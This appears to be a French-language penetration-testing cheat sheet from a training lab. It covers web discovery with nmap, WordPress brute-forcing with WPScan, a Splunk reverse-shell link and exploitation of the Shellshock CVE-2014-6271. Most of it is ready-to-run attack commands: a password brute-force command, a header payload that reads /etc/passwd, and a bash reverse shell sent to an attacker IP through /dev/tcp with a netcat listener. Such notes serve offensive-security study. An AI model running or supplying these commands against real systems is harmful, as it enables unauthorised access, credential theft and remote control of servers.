
https://github.com/RedSiege/EyeWitness

https://github.com/michenriksen/aquatone

## Enumération des Applications 
### Nmap - Découverte Web

```
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

### Wordpress
WPScan
est un scanner et un outil d'énumération automatisé pour WordPress. Il détermine si les différents thèmes et plugins utilisés par un blog sont obsolètes ou vulnérables.
#### Brute Force de Connexion
WPScan peut être utilisé pour attaquer par force brute les noms d'utilisateur et les mots de passe.

```
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### Splunk 
https://github.com/0xjpuff/reverse_shell_splunk


### Attaque CGI 

exploitation de la vulnerabilité https://nvd.nist.gov/vuln/detail/CVE-2014-6271

- enumeration gobuster 
```
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```


```
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

confirmation de la vulnerabilité 

```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

access shell inversé 

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

```
sudo nc -lvnp 7777
```

attenuation de la vulnerabilité 

https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability